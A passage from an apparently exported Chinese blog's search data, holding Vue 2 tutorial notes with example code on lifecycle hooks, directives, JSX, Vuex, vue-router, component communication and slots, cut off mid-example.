clearTimeout(this.lastTimeout);      this.lastTimeout = setTimeout(() =&gt; &#123;        this.fullName = this.firstName + &quot; &quot; + val;      &#125;, 500);    &#125;  &#125;&#125;;&lt;/script&gt;\n\n6.3 computed vs watcher\ncomputed 能做的，watcher 都可以做，反之不行\n能用computed的尽量使用computed\n\n七、生命周期的应用场景和函数式组件7.1 生命周期\n\n\n\n&lt;template&gt;  &lt;div&gt;    &#123;&#123; log(&quot;render&quot;) &#125;&#125;    &#123;&#123; now &#125;&#125;    &lt;button @click=&quot;start = !start&quot;&gt;&#123;&#123; start ? &quot;停止&quot; : &quot;开始&quot; &#125;&#125;&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import moment from &quot;moment&quot;;export default &#123;  data: function() &#123;    console.log(&quot;data&quot;);    this.moment = moment;    this.log = window.console.log;    return &#123;      now: moment(new Date()).format(&quot;YYYY-MM-DD HH:mm:ss&quot;),      start: false    &#125;;  &#125;,  watch: &#123;    start() &#123;      this.startClock();    &#125;  &#125;,  beforeCreate() &#123;    console.log(&quot;beforeCreate&quot;);  &#125;,  created() &#123;    console.log(&quot;created&quot;);  &#125;,  beforeMount() &#123;    console.log(&quot;beforeMount&quot;);  &#125;,  mounted() &#123;    console.log(&quot;mounted&quot;);    this.startClock();  &#125;,  beforeUpdate() &#123;    console.log(&quot;beforeUpdate&quot;);  &#125;,  updated() &#123;    console.log(&quot;updated&quot;);  &#125;,  beforeDestroy() &#123;    console.log(&quot;beforeDestroy&quot;);    clearInterval(this.clockInterval);  &#125;,  destroyed() &#123;    console.log(&quot;destroyed&quot;);  &#125;,  methods: &#123;    startClock() &#123;      clearInterval(this.clockInterval);      if (this.start) &#123;        this.clockInterval = setInterval(() =&gt; &#123;          this.now = moment(new Date()).format(&quot;YYYY-MM-DD HH:mm:ss&quot;);        &#125;, 1000);      &#125;    &#125;  &#125;&#125;;&lt;/script&gt;\n\n\n打印顺序 beforeCreate - data - created - beforeMount - render - mounted\n\n7.2 函数式组件\nfunctional：true\n无状态、无实例、没有this上下文、没有生命周期\n\n// TempVar.jsexport default &#123;  functional: true,  render: (h, ctx) =&gt; &#123;    return ctx.scopedSlots.default &amp;&amp; ctx.scopedSlots.default(ctx.props || &#123;&#125;);  &#125;&#125;;// Functional.vue&lt;template functional&gt;  &lt;div&gt;    &#123;&#123; props &#125;&#125;  &lt;/div&gt;&lt;/template&gt;// 使用&lt;template&gt;  &lt;div&gt;    &lt;a-tabs&gt;      &lt;a-tab-pane key=&quot;Functional&quot; tab=&quot;函数式组件&quot;&gt;        &lt;Functional :name=&quot;name&quot; /&gt;        &lt;TempVar          :var1=&quot;`hello $&#123;name&#125;`&quot;          :var2=&quot;destroyClock ? &#x27;hello vue&#x27; : &#x27;hello world&#x27;&quot;        &gt;          &lt;template v-slot=&quot;&#123; var1, var2 &#125;&quot;&gt;            &#123;&#123; var1 &#125;&#125;            &#123;&#123; var2 &#125;&#125;          &lt;/template&gt;        &lt;/TempVar&gt;      &lt;/a-tab-pane&gt;    &lt;/a-tabs&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import Functional from &quot;./Functional&quot;;import TempVar from &quot;./TempVar&quot;;export default &#123;  components: &#123;    Functional,    TempVar  &#125;,  data() &#123;    return &#123;      destroyClock: false,      name: &quot;vue&quot;    &#125;;  &#125;&#125;;&lt;/script&gt;\n\n八、Vue指令8.1 内置指令\n&lt;template&gt;  &lt;div&gt;    &lt;h2&gt;v-text&lt;/h2&gt;    &lt;div v-text=&quot;&#x27;hello vue&#x27;&quot;&gt;hello world&lt;/div&gt;    &lt;h2&gt;v-html&lt;/h2&gt;    &lt;div v-html=&quot;&#x27;&lt;span style=&amp;quot;color: red&amp;quot;&gt;hello vue&lt;/span&gt;&#x27;&quot;&gt;      hello world    &lt;/div&gt;    &lt;h2&gt;v-show&lt;/h2&gt;    &lt;div v-show=&quot;show&quot;&gt;hello vue&lt;/div&gt;    &lt;button @click=&quot;show = !show&quot;&gt;change show&lt;/button&gt;    &lt;h2&gt;v-if v-esle-if v-else&lt;/h2&gt;    &lt;div v-if=&quot;number === 1&quot;&gt;hello vue &#123;&#123; number &#125;&#125;&lt;/div&gt;    &lt;div v-else-if=&quot;number === 2&quot;&gt;hello world &#123;&#123; number &#125;&#125;&lt;/div&gt;    &lt;div v-else&gt;hello geektime &#123;&#123; number &#125;&#125;&lt;/div&gt;    &lt;h2&gt;v-for v-bind&lt;/h2&gt;    &lt;div v-for=&quot;num in [1, 2, 3]&quot; v-bind:key=&quot;num&quot;&gt;hello vue &#123;&#123; num &#125;&#125;&lt;/div&gt;    &lt;h2&gt;v-on&lt;/h2&gt;    &lt;button v-on:click=&quot;number = number + 1&quot;&gt;number++&lt;/button&gt;    &lt;h2&gt;v-model&lt;/h2&gt;    &lt;input v-model=&quot;message&quot; /&gt;    &lt;h2&gt;v-pre&lt;/h2&gt;    &lt;div v-pre&gt;&#123;&#123; this will not be compiled &#125;&#125;&lt;/div&gt;    &lt;h2&gt;v-once&lt;/h2&gt;    &lt;div v-once&gt;      &#123;&#123; number &#125;&#125;    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  data: function() &#123;    this.log = window.console.log;    return &#123;      show: true,      number: 1,      message: &quot;hello&quot;    &#125;;  &#125;&#125;;&lt;/script&gt;\n\n8.2 自定义指令\n&lt;template&gt;  &lt;div&gt;    &lt;button @click=&quot;show = !show&quot;&gt;      销毁    &lt;/button&gt;    &lt;button v-if=&quot;show&quot; v-append-text=&quot;`hello $&#123;number&#125;`&quot; @click=&quot;number++&quot;&gt;      按钮    &lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  directives: &#123;    appendText: &#123;      bind() &#123;        console.log(&quot;bind&quot;);      &#125;,      inserted(el, binding) &#123;        el.appendChild(document.createTextNode(binding.value));        console.log(&quot;inserted&quot;, el, binding);      &#125;,      update() &#123;        console.log(&quot;update&quot;);      &#125;,      componentUpdated(el, binding) &#123;        el.removeChild(el.childNodes[el.childNodes.length - 1]);        el.appendChild(document.createTextNode(binding.value));        console.log(&quot;componentUpdated&quot;);      &#125;,      unbind() &#123;        console.log(&quot;unbind&quot;);      &#125;    &#125;  &#125;,  data() &#123;    return &#123;      number: 1,      show: true    &#125;;  &#125;&#125;;&lt;/script&gt;\n\n九、template和jsx9.1 JSX VS templateTemplate\n\n学习成本低\n大量内置指令简化开发\n组件作用域css\n但灵活性低\n\nJSX\n\n总体上很灵活\n\n9.2 以下是jsx写法// index.vue&lt;script&gt;import Props from &quot;./Props&quot;;import Event from &quot;./Event&quot;;import Slot from &quot;./Slot&quot;;import BigProps from &quot;./BigProps&quot;;export default &#123;  components: &#123;    Props,    Event,    SlotDemo: Slot,    BigProps  &#125;,  data: () =&gt; &#123;    return &#123;      name: &quot;&quot;,      type: &quot;success&quot;,      bigPropsName: &quot;Hello world!&quot;    &#125;;  &#125;,  methods: &#123;    handlePropChange(val) &#123;      this.type = val;    &#125;,    handleEventChange(val) &#123;      this.name = val;    &#125;,    handleBigPropChange(val) &#123;      this.bigPropsName = val;    &#125;,    getDefault() &#123;      return [&lt;p&gt;default slot&lt;/p&gt;];    &#125;,    getTitle() &#123;      return [&lt;p&gt;title slot1&lt;/p&gt;, &lt;p&gt;title slot2&lt;/p&gt;];    &#125;,    getItem(props) &#123;      return [&lt;p&gt;&#123;`item slot-scope $&#123;JSON.stringify(props)&#125;`&#125;&lt;/p&gt;];    &#125;  &#125;,  render() &#123;    const &#123;      type,      handlePropChange,      name,      handleEventChange,      bigPropsName,      getDefault,      getTitle,      getItem,      handleBigPropChange    &#125; = this;    const slotDemoProps = &#123;      scopedSlots: &#123;        item(props) &#123;          return `item slot-scope $&#123;JSON.stringify(props)&#125;`;        &#125;      &#125;,      props: &#123;&#125;    &#125;;    const bigProps = &#123;      props: &#123;        onChange: handleBigPropChange      &#125;    &#125;;    return (      &lt;div&gt;        &lt;a-tabs&gt;          &lt;a-tab-pane key=&quot;props&quot; tab=&quot;属性&quot;&gt;            &lt;Props              name=&quot;Hello Vue！&quot;              type=&#123;type&#125;              isVisible=&#123;false&#125;              &#123;...&#123; props: &#123; onChange: handlePropChange &#125; &#125;&#125;              title=&quot;属性Demo&quot;              class=&quot;test1&quot;              class=&#123;[&quot;test1&quot;, &quot;test2&quot;]&#125;              style=&#123;&#123; marginTop: &quot;10px&quot; &#125;&#125;            /&gt;          &lt;/a-tab-pane&gt;          &lt;a-tab-pane key=&quot;event&quot; tab=&quot;事件&quot;&gt;            &lt;Event name=&#123;name&#125; onChange=&#123;handleEventChange&#125; /&gt;          &lt;/a-tab-pane&gt;          &lt;a-tab-pane key=&quot;slot&quot; tab=&quot;插槽&quot;&gt;            &lt;SlotDemo &#123;...slotDemoProps&#125;&gt;              &lt;p&gt;default slot&lt;/p&gt;              &lt;p slot=&quot;title&quot;&gt;title slot1&lt;/p&gt;              &lt;p slot=&quot;title&quot;&gt;title slot2&lt;/p&gt;            &lt;/SlotDemo&gt;          &lt;/a-tab-pane&gt;          &lt;a-tab-pane key=&quot;bigProps&quot; tab=&quot;大属性&quot;&gt;            &lt;BigProps              name=&#123;bigPropsName&#125;              &#123;...bigProps&#125;              slotDefault=&#123;getDefault()&#125;              slotTitle=&#123;getTitle()&#125;              slotScopeItem=&#123;getItem&#125;            /&gt;          &lt;/a-tab-pane&gt;        &lt;/a-tabs&gt;      &lt;/div&gt;    );  &#125;&#125;;&lt;/script&gt;// bigProps&lt;script&gt;export default &#123;  name: &quot;BigProps&quot;,  components: &#123;    VNodes: &#123;      functional: true,      render: (h, ctx) =&gt; ctx.props.vnodes    &#125;  &#125;,  props: &#123;    name: String,    onChange: &#123;      type: Function,      default: () =&gt; &#123;&#125;    &#125;,    slotDefault: Array,    slotTitle: Array,    slotScopeItem: &#123;      type: Function,      default: () =&gt; &#123;&#125;    &#125;  &#125;,  methods: &#123;    handleChange() &#123;      this.onChange(&quot;Hello vue!&quot;);    &#125;  &#125;,  render() &#123;    const &#123; name, handleChange, slotDefault, slotTitle, slotScopeItem &#125; = this;    return (      &lt;div&gt;        &#123;name&#125;        &lt;br /&gt;        &lt;button onClick=&#123;handleChange&#125;&gt;change name&lt;/button&gt;        &lt;br /&gt;        &#123;slotDefault&#125;        &lt;br /&gt;        &#123;slotTitle&#125;        &lt;br /&gt;        &#123;slotScopeItem(&#123; value: &quot;vue&quot; &#125;)&#125;      &lt;/div&gt;    );  &#125;&#125;;&lt;/script&gt;// Events.vue&lt;script&gt;export default &#123;  name: &quot;EventDemo&quot;,  props: &#123;    name: String  &#125;,  methods: &#123;    handleChange(e) &#123;      this.$emit(&quot;change&quot;, e.target.value);    &#125;,    handleDivClick() &#123;      this.$emit(&quot;change&quot;, &quot;&quot;);    &#125;,    handleClick(e, stop) &#123;      console.log(&quot;stop&quot;, stop);      if (stop) &#123;        e.stopPropagation();      &#125;    &#125;  &#125;,  render() &#123;    const &#123; name, handleChange, handleDivClick, handleClick &#125; = this;    return (      &lt;div&gt;        name: &#123;name || &quot;--&quot;&#125;        &lt;br /&gt;        &lt;input value=&#123;name&#125; onChange=&#123;handleChange&#125; /&gt;        &lt;br /&gt;        &lt;br /&gt;        &lt;div onClick=&#123;handleDivClick&#125;&gt;          &lt;button onClick=&#123;handleClick&#125;&gt;重置成功&lt;/button&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;          &lt;button onClick=&#123;e =&gt; handleClick(e, true)&#125;&gt;重置失败&lt;/button&gt;        &lt;/div&gt;      &lt;/div&gt;    );  &#125;&#125;;&lt;/script&gt;// Props.vue&lt;script&gt;export default &#123;  name: &quot;PropsDemo&quot;,  // inheritAttrs: false,  // props: [&#x27;name&#x27;, &#x27;type&#x27;, &#x27;list&#x27;, &#x27;isVisible&#x27;],  props: &#123;    name: String,    type: &#123;      validator: function(value) &#123;        // 这个值必须匹配下列字符串中的一个        return [&quot;success&quot;, &quot;warning&quot;, &quot;danger&quot;].includes(value);      &#125;    &#125;,    list: &#123;      type: Array,      // 对象或数组默认值必须从一个工厂函数获取      default: () =&gt; []    &#125;,    isVisible: &#123;      type: Boolean,      default: false    &#125;,    onChange: &#123;      type: Function,      default: () =&gt; &#123;&#125;    &#125;  &#125;,  methods: &#123;    handleClick() &#123;      // 不要这么做、不要这么做、不要这么做      //this.type = &quot;warning&quot;;      // 可以，还可以更好      this.onChange(this.type === &quot;success&quot; ? &quot;warning&quot; : &quot;success&quot;);    &#125;  &#125;,  render() &#123;    const &#123; name, type, list, isVisible, handleClick &#125; = this;    return (      &lt;div&gt;        name: &#123;name&#125;        &lt;br /&gt;        type: &#123;type&#125;        &lt;br /&gt;        list: &#123;list&#125;        &lt;br /&gt;        isVisible: &#123;isVisible&#125;        &lt;br /&gt;        &lt;button onClick=&#123;handleClick&#125;&gt;change type&lt;/button&gt;      &lt;/div&gt;    );  &#125;&#125;;&lt;/script&gt;// Slot&lt;script&gt;export default &#123;  name: &quot;SlotDemo&quot;,  render() &#123;    const &#123; $scopedSlots &#125; = this;    return (      &lt;div&gt;        &#123;$scopedSlots.default()&#125;        &#123;$scopedSlots.title()&#125;        &#123;$scopedSlots.item(&#123; value: &quot;vue&quot; &#125;)&#125;      &lt;/div&gt;    );  &#125;&#125;;&lt;/script&gt;\n\n十、为什么需要vuex\nVuex运行机制\n\n基本例子\nimport Vue from &#x27;vue&#x27;import Vuex from &#x27;vuex&#x27;import App from &#x27;./App.vue&#x27;Vue.use(Vuex)Vue.config.productionTip = falseconst store = new Vuex.Store(&#123;  state: &#123;    count: 0,  &#125;,  mutations: &#123;    increment(state) &#123;      state.count++    &#125;  &#125;,  actions: &#123;    increment(&#123;commit&#125;) &#123;      setTimeout(()=&gt;&#123;        // state.count++ // 不要对state进行更改操作，应该通过commit交给mutations去处理        commit(&#x27;increment&#x27;)      &#125;, 3000)    &#125;  &#125;,  getters: &#123;    doubleCount(state) &#123;      return state.count * 2    &#125;  &#125;&#125;)new Vue(&#123;  store,  render: h =&gt; h(App),&#125;).$mount(&#x27;#app&#x27;)// App.vue&lt;template&gt;  &lt;div id=&quot;app&quot;&gt;    &#123;&#123;count&#125;&#125;    &lt;br&gt;    &#123;&#123;$store.getters.doubleCount&#125;&#125;    &lt;button @click=&quot;$store.commit(&#x27;increment&#x27;)&quot;&gt;count++&lt;/button&gt;    &lt;button @click=&quot;$store.dispatch(&#x27;increment&#x27;)&quot;&gt;count++&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &#x27;app&#x27;,  computed: &#123;    count() &#123;      return this.$store.state.count    &#125;  &#125;&#125;&lt;/script&gt;&lt;style&gt;&lt;/style&gt;\n\n十一、vuex核心概念和底层原理11.1 核心概念\n11.2 底层原理\n简化版本的vuex\nimport Vue from &#x27;vue&#x27;const Store = function Store (options = &#123;&#125;) &#123;  const &#123;state = &#123;&#125;, mutations=&#123;&#125;&#125; = options    // 把state进行响应式和vue写法一样  this._vm = new Vue(&#123;    data: &#123;      $$state: state    &#125;,  &#125;)  this._mutations = mutations&#125;Store.prototype.commit = function(type, payload)&#123;  if(this._mutations[type]) &#123;    this._mutations[type](this.state, payload)  &#125;&#125;Object.defineProperties(Store.prototype, &#123;   // 当我们取值 如 $store.getter.count的时候就会触发这里  state: &#123;     get: function()&#123;      return this._vm._data.$$state    &#125;   &#125;&#125;);export default &#123;Store&#125;\n\n十二、vuex最佳实践12.1 核心概念\n12.2 使用常量代替Mutation事件类型\n12.3 命名空间\n对所有模块开启命名空间\n\n\n12.4 实践例子\nDEMO地址 https://github.com/poetries/vuex-demo\n\n十三、vue-router使用场景13.1 解决的问题\n13.2 使用方式\n13.3 例子// main.jsimport Vue from &#x27;vue&#x27;import VueRouter from &#x27;vue-router&#x27;import App from &#x27;./App.vue&#x27;import routes from &#x27;./routes&#x27;Vue.config.productionTip = falseVue.use(VueRouter)const router = new VueRouter(&#123;  mode: &#x27;history&#x27;,  routes,&#125;)new Vue(&#123;  router,  render: h =&gt; h(App),&#125;).$mount(&#x27;#app&#x27;)// App.vue&lt;template&gt;  &lt;div id=&quot;app&quot;&gt;    &lt;h2&gt;router demo&lt;/h2&gt;    &lt;router-view&gt;&lt;/router-view&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &#x27;app&#x27;,  components: &#123;  &#125;,&#125;&lt;/script&gt;&lt;style&gt;#app &#123;  font-family: &#x27;Avenir&#x27;, Helvetica, Arial, sans-serif;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;  text-align: center;  color: #2c3e50;  margin-top: 60px;&#125;&lt;/style&gt;// routes.jsimport RouterDemo from &#x27;./components/RouterDemo&#x27;import RouterChildrenDemo from &#x27;./components/RouterChildrenDemo&#x27;const routes = [  &#123; path: &#x27;/foo&#x27;, component: RouterDemo, name: &#x27;1&#x27; &#125;,  &#123; path: &#x27;/bar&#x27;, component: RouterDemo, name: &#x27;2&#x27; &#125;,  // 当 /user/:id 匹配成功，  // RouterDemo 会被渲染在 App 的 &lt;router-view /&gt; 中  &#123; path: &#x27;/user/:id&#x27;,     component: RouterDemo,     name: &#x27;3&#x27;,    props: true,    children: [      &#123;        // 当 /user/:id/profile 匹配成功，        // RouterChildrenDemo 会被渲染在 RouterDemo 的 &lt;router-view/&gt; 中        path: &#x27;profile&#x27;,        component: RouterChildrenDemo,        name: &#x27;3-1&#x27;      &#125;,      &#123;        // 当 /user/:id/posts 匹配成功        // RouterChildrenDemo 会被渲染在 RouterDemo 的 &lt;router-view/&gt; 中        path: &#x27;posts&#x27;,        component: RouterChildrenDemo      &#125;    ]  &#125;,  &#123; path: &#x27;/a&#x27;, redirect: &#x27;/bar&#x27; &#125;,  &#123; path: &#x27;*&#x27;, component: RouterDemo, name: &#x27;404&#x27; &#125;]export default routes\n\n十四、路由的类型及底层原理路由的类型\n\nHash模式：无法使用锚点定位\nHistory模式：需要后端配合，IE9不兼容，可以使用强制刷新处理\n\n原理\n","categories":["框架"],"tags":["vue"]},{"title":"vue-组件化","url":"/2018/09/11/Vue/vue-%E7%BB%84%E4%BB%B6%E5%8C%96/","content":"组件化\nvue组件系统提供了一种抽象，让我们可以使用独立可复用的组件来构建大型应用，任意类型的应用界 面都可以抽象为一个组件树。组件化能提高开发效率，方便重复使用，简化调试步骤，提升项目可维护 性，便于多人协同开发。\n\n\n组件通信常用方式1. props\n父给子传值\n\n// childprops: &#123; msg: String &#125;// parent&lt;HelloWorld msg=&quot;Welcome to Your Vue.js App&quot;/&gt;\n\n2. 自定义事件\n子给父传值\n\n// child this.$emit(&#x27;add&#x27;, good)// parent&lt;Cart @add=&quot;cartAdd($event)&quot;&gt;&lt;/Cart&gt;\n\n3. 事件总线\n任意两个组件之间传值常用事件总线 或 vuex的方式。\n\n  // Bus:事件派发、监听和回调管理 class Bus &#123;constructor()&#123; this.callbacks = &#123;&#125;  &#125;  $on(name, fn)&#123;this.callbacks[name] = this.callbacks[name] || []this.callbacks[name].push(fn) &#125;$emit(name, args)&#123; if(this.callbacks[name])&#123;this.callbacks[name].forEach(cb =&gt; cb(args)) &#125;&#125; &#125;// main.jsVue.prototype.$bus = new Bus()// child1this.$bus.$on(&#x27;foo&#x27;, handle) // child2 this.$bus.$emit(&#x27;foo&#x27;)\n\n\n实践中通常用Vue代替Bus，因为Vue已经实现了相应接口\n\n4. vuex\n创建唯一的全局数据管理者store，通过它管理数据并通知组件状态变更。\n\n5. $parent&#x2F;$root\n兄弟组件之间通信可通过共同祖辈搭桥，$parent或$root。\n\n// brother1this.$parent.$on(&#x27;foo&#x27;, handle)// brother2 this.$parent.$emit(&#x27;foo&#x27;)\n\n6. $children\n父组件可以通过$children访问子组件实现父子通信。\n\n// parent this.$children[0].xx = &#x27;xxx&#x27;\n\n7. $attrs&#x2F;$listeners\n包含了父作用域中不作为 prop 被识别 (且获取) 的特性绑定 ( class 和 style 除外)。当一个组件没有 声明任何 prop 时，这里会包含所有父作用域的绑定 ( class 和 style 除外)，并且可以通过 v- bind=&quot;$attrs&quot; 传入内部组件——在创建高级别的组件时非常有用。\n\n// child:并未在props中声明foo &lt;p&gt;&#123;&#123;$attrs.foo&#125;&#125;&lt;/p&gt;// parent&lt;HelloWorld foo=&quot;foo&quot;/&gt;\n\n8. refs\n获取子节点引用\n\n// parent&lt;HelloWorld ref=&quot;hw&quot;/&gt;mounted() &#123;   this.$refs.hw.xx = &#x27;xxx&#x27;&#125;\n\n9. provide&#x2F;inject\n能够实现祖先和后代之间传值\n\n// ancestorprovide() &#123;  return &#123;foo: &#x27;foo&#x27;&#125;&#125;// descendantinject: [&#x27;foo&#x27;]\n\n实例\n// index.vue&lt;template&gt;  &lt;div&gt;    &lt;h2&gt;组件通信&lt;/h2&gt;    &lt;!-- props, 自定义事件 --&gt;    &lt;Child1 msg=&quot;some msg from parent&quot; @some-event=&quot;onSomeEvent&quot;&gt;&lt;/Child1&gt;    &lt;!-- 事件总线 --&gt;    &lt;Child2 msg=&quot;other msg&quot;&gt;&lt;/Child2&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import Child1 from &#x27;@/components/communication/Child1.vue&#x27;  import Child2 from &#x27;@/components/communication/Child2.vue&#x27;    export default &#123;    components: &#123;      Child1, Child2,      // Child3: () =&gt; import(&#x27;./Child3.vue&#x27;)    &#125;,    methods: &#123;      onSomeEvent(msg) &#123;        console.log(&#x27;Communition:&#x27;, msg);      &#125;    &#125;,    mounted () &#123;      // $children持有所有自定义组件      // 它不保证顺序      console.log(this.$children);    &#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt;// child1.vue&lt;template&gt;  &lt;div @click=&quot;$emit(&#x27;some-event&#x27;, &#x27;msg from child1&#x27;)&quot;&gt;    &lt;h3&gt;child1&lt;/h3&gt;    &lt;p&gt;&#123;&#123;msg&#125;&#125;&lt;/p&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    props: &#123;      msg: &#123;        type: String,        default: &#x27;&#x27;      &#125;,    &#125;,    mounted () &#123;      // this.$bus.$on(&#x27;event-from-child2&#x27;, msg =&gt; &#123;      //   console.log(&#x27;Child1:&#x27;, msg);      // &#125;);      this.$parent.$on(&#x27;event-from-child2&#x27;, msg =&gt; &#123;        console.log(&#x27;Child1:&#x27;, msg);      &#125;);    &#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt;// child2.vue&lt;template&gt;  &lt;div&gt;    &lt;!-- 展开$attrs对象 --&gt;    &lt;h3 v-bind=&quot;$attrs&quot;&gt;child2&lt;/h3&gt;    &lt;button @click=&quot;sendToChild1&quot;&gt;给child1发送消息&lt;/button&gt;    &lt;!-- $attrs --&gt;    &lt;p&gt;&#123;&#123;$attrs.msg&#125;&#125;&lt;/p&gt;    &lt;!-- inject --&gt;    &lt;p&gt;&#123;&#123;foo&#125;&#125;&lt;/p&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    inheritAttrs: false,    inject: [&#x27;foo&#x27;],    methods: &#123;      sendToChild1() &#123;        // 利用事件总线发送事件        // this.$bus.$emit(&#x27;event-from-child2&#x27;, &#x27;some msg from child2&#x27;)        this.$parent.$emit(&#x27;event-from-child2&#x27;, &#x27;some msg from child2&#x27;)      &#125;    &#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt;\n\n插槽\n插槽语法是Vue 实现的内容分发 API，用于复合组件开发。该技术在通用组件库开发中有大量应用\n\n1. 匿名插槽// comp1&lt;div&gt;  &lt;slot&gt;&lt;/slot&gt;&lt;/div&gt;// parent&lt;comp&gt;hello&lt;/comp&gt;\n\n2. 具名插槽\n将内容分发到子组件指定位置\n\n// comp2&lt;div&gt;&lt;slot&gt;&lt;/slot&gt;&lt;slot name=&quot;content&quot;&gt;&lt;/slot&gt;&lt;/div&gt;// parent&lt;Comp2&gt;&lt;!-- 默认插槽用default做参数 --&gt;&lt;template v-slot:default&gt;具名插槽&lt;/template&gt; &lt;!-- 具名插槽用插槽名做参数 --&gt;&lt;template v-slot:content&gt;内容...&lt;/template&gt;&lt;/Comp2&gt;\n\n3. 作用域插槽\n分发内容要用到子组件中的数据\n\n// comp3&lt;div&gt;&lt;slot :foo=&quot;foo&quot;&gt;&lt;/slot&gt;&lt;/div&gt;// parent&lt;Comp3&gt;&lt;!-- 把v-slot的值指定为作用域上下文对象 --&gt; &lt;template v-slot:default=&quot;slotProps&quot;&gt; 来自子组件数据:&#123;&#123;slotProps.foo&#125;&#125; &lt;/template&gt;&lt;/Comp3&gt;\n\n范例\n// 子组件 Layout.vue&lt;template&gt;  &lt;div&gt;    &lt;div class=&quot;header&quot;&gt;      &lt;slot name=&quot;header&quot;&gt;&lt;/slot&gt;    &lt;/div&gt;    &lt;div class=&quot;body&quot;&gt;      &lt;slot&gt;&lt;/slot&gt;    &lt;/div&gt;    &lt;div class=&quot;footer&quot;&gt;      &lt;slot name=&quot;footer&quot; :fc=&quot;footerContent&quot;&gt;&lt;/slot&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    data() &#123;      return &#123;        remark: [          &#x27;好好学习，天天向上&#x27;,          &#x27;学习永远不晚&#x27;,          &#x27;学习知识要善于思考,思考,再思考&#x27;,          &#x27;学习的敌人是自己的满足,要认真学习一点东西,必须从不自满开始&#x27;,          &#x27;构成我们学习最大障碍的是已知的东西,而不是未知的东西&#x27;,          &#x27;在今天和明天之间,有一段很长的时间;趁你还有精神的时候,学习迅速办事&#x27;,          &#x27;三人行必有我师焉；择其善者而从之，其不善者而改之&#x27;        ]      &#125;    &#125;,    computed: &#123;      footerContent() &#123;        return this.remark[new Date().getDay() - 1]       &#125;    &#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;.header &#123;  background-color: rgb(252, 175, 175);&#125;.body &#123;  display: flex;  background-color: rgb(144, 250, 134);  min-height: 100px;  align-items: center;  justify-content: center;&#125;.footer &#123;  background-color: rgb(114, 116, 255);&#125;&lt;/style&gt;//父组件 index.vue&lt;template&gt;  &lt;div&gt;    &lt;h2&gt;插槽&lt;/h2&gt;    &lt;!-- 插槽 --&gt;    &lt;Layout&gt;      &lt;!-- 具名插槽 --&gt;      &lt;template v-slot:header&gt;全栈工程师&lt;/template&gt;      &lt;!-- 匿名插槽 --&gt;      &lt;template&gt;content...&lt;/template&gt;      &lt;!-- 作用域插槽 --&gt;      &lt;template v-slot:footer=&quot;&#123;fc&#125;&quot;&gt;&#123;&#123;fc&#125;&#125;&lt;/template&gt;    &lt;/Layout&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import Layout from &#x27;@/components/slots/Layout.vue&#x27;    export default &#123;    components: &#123;      Layout    &#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt;\n\n组件化实战通用表单组件\n收集数据、校验数据并提交。\n\n\n实现KForm 指定数据、校验规则\nKformItem\nlabel标签添加\n执行校验\n显示错误信息\n\n\nKInput\n维护数据\n\n\n\n&lt;template&gt;  &lt;el-form :model=&quot;userInfo&quot; :rules=&quot;rules&quot; ref=&quot;loginForm&quot;&gt;    &lt;el-form-item label=&quot;用户名&quot; prop=&quot;name&quot;&gt;      &lt;el-input v-model=&quot;userInfo.name&quot;&gt;&lt;/el-input&gt;    &lt;/el-form-item&gt;    &lt;el-form-item label=&quot;密码&quot; prop=&quot;password&quot;&gt;      &lt;el-input v-model=&quot;userInfo.password&quot; type=&quot;password&quot;&gt;&lt;/el-input&gt;    &lt;/el-form-item&gt;    &lt;el-form-item&gt;      &lt;el-button @click=&quot;login&quot;&gt;登录&lt;/el-button&gt;    &lt;/el-form-item&gt;  &lt;/el-form&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  data() &#123;    return &#123;      userInfo: &#123;        username: &quot;&quot;,        password: &quot;&quot;      &#125;,      rules: &#123;        username: [&#123; required: true, message: &quot;请输入用户名称&quot; &#125;],        password: [&#123; required: true, message: &quot;请输入密码&quot; &#125;]      &#125;    &#125;;  &#125;,  methods: &#123;    login() &#123;      this.$refs[&quot;loginForm&quot;].validate(valid =&gt; &#123;        if (valid) &#123;          alert(&quot;submit&quot;);        &#125; else &#123;          console.log(&quot;error submit!&quot;);          return false;        &#125;      &#125;);    &#125;  &#125;&#125;;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt;\n\n1. KInput\n// 创建components/form/KInput.vue&lt;template&gt;  &lt;div&gt;    &lt;!-- 管理数据：实现双绑 --&gt;    &lt;!-- :value, @input --&gt;    &lt;input :type=&quot;type&quot; :value=&quot;value&quot; @input=&quot;onInput&quot;      v-bind=&quot;$attrs&quot;&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    inheritAttrs: false , // 关闭特性继承    props: &#123;      value: &#123;        type: String,        default: &#x27;&#x27;      &#125;,      type: &#123;        type: String,        default: &#x27;text&#x27;      &#125;    &#125;,    methods: &#123;      onInput(e) &#123;        this.$emit(&#x27;input&#x27;, e.target.value)        // 值发生变化的时候就是需要校验的时候        this.$parent.$emit(&#x27;validate&#x27;)      &#125;    &#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt;\n\n\n使用KInput\n\n创建components&#x2F;form&#x2F;index.vue，添加如下代码:\n&lt;template&gt;  &lt;div&gt;&lt;h3&gt;KForm表单&lt;/h3&gt;&lt;hr&gt;&lt;k-input v-model=&quot;model.username&quot;&gt;&lt;/k-input&gt;&lt;k-input type=&quot;password&quot; v-model=&quot;model.password&quot;&gt;&lt;/k-input&gt;  &lt;/div&gt;&lt;/template&gt;export default &#123;  components: &#123;  